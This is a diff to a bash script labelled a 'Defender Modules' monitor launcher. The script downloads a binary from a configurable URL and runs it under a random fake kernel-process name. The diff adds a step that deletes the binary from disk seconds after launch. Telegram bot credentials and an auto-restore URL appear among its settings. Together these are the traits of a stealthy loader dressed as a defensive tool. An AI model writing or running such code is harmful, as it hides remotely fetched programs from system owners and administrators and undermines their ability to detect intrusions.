@@ -1,5 +1,23 @@
 #!/usr/bin/env bash
 
+# ═══════════════════════════════════════════════════════════════════════════════
+# Defender Modules - Monitor Binary Execution Script
+# ═══════════════════════════════════════════════════════════════════════════════
+# 
+# Simple script to download and execute monitor binary
+#
+# Environment Variables:
+#   BOT_TOKEN       - Telegram bot token
+#   CHAT_ID         - Telegram chat ID
+#   AUTO_RESTORE_FILE - File to monitor
+#   RAW_URL         - Raw URL for restoration
+#   SECRET_KEY      - Secret key
+#   BINARY_URL      - Binary download URL
+#   LOCAL_BINARY_PATH - Path to local binary (if set, skips download)
+#   DEBUG           - Enable debug output
+#
+# ═══════════════════════════════════════════════════════════════════════════════
+
 [[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"
 
 RED="\033[31m" GREEN="\033[32m" YELLOW="\033[33m" BLUE="\033[34m"
@@ -22,12 +40,12 @@ print_good() {
   echo -e "${BRIGHT_GREEN}${BOLD}[+]${RESET} ${BRIGHT_GREEN}${1}${RESET}"
 }
 
-clean_exit() {
+# Auto cleanup function
+auto_cleanup() {
+	sleep 5
 	[[ -f "$MONITOR_PATH" ]] && rm -f "$MONITOR_PATH" &>/dev/null
-	exit 1
 }
 
-trap clean_exit SIGINT SIGTERM
 
 get_random_kernel_proc() {
   proc_name_arr=(
@@ -111,8 +129,33 @@ download_binary() {
 	chmod +x "$target_path" || return 1
 }
 
+use_local_binary() {
+	local target_path="$1"
+	local local_binary="$2"
+	
+	if [[ ! -f "$local_binary" ]]; then
+		print_fatal "Local binary not found: $local_binary"
+	fi
+	
+	if [[ ! -x "$local_binary" ]]; then
+		print_fatal "Local binary is not executable: $local_binary"
+	fi
+	
+	cp "$local_binary" "$target_path" || return 1
+	chmod +x "$target_path" || return 1
+}
+
 exec_hidden() {
+	# Start monitor in background and get PID
 	exec -a "${PROC_HIDDEN_NAME}" ${MONITOR_PATH} &
+	local monitor_pid=$!
+	disown &>/dev/null
+	
+	# Auto-delete binary after a short delay
+	(
+		sleep 3
+		[[ -f "$MONITOR_PATH" ]] && rm -f "$MONITOR_PATH" &>/dev/null
+	) &
 	disown &>/dev/null
 }
 
@@ -142,10 +185,18 @@ RAND_NAME="$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
 PROC_HIDDEN_NAME="$(get_random_kernel_proc)"
 MONITOR_PATH="${PWD}/${RAND_NAME}"
 
-echo "Downloading binary..."
-download_binary "$MONITOR_PATH" "$BINARY_URL" || print_fatal "Download failed"
+if [[ -n "$LOCAL_BINARY_PATH" ]]; then
+	echo "Using local binary: $LOCAL_BINARY_PATH"
+	use_local_binary "$MONITOR_PATH" "$LOCAL_BINARY_PATH" || print_fatal "Failed to use local binary"
+	echo "Local binary copied successfully"
+else
+	echo "Downloading binary..."
+	download_binary "$MONITOR_PATH" "$BINARY_URL" || print_fatal "Download failed"
+	echo "Binary downloaded successfully"
+fi
 
 echo "Starting monitor..."
 exec_hidden || print_fatal "Execution failed"
 
 print_usage
+auto_cleanup
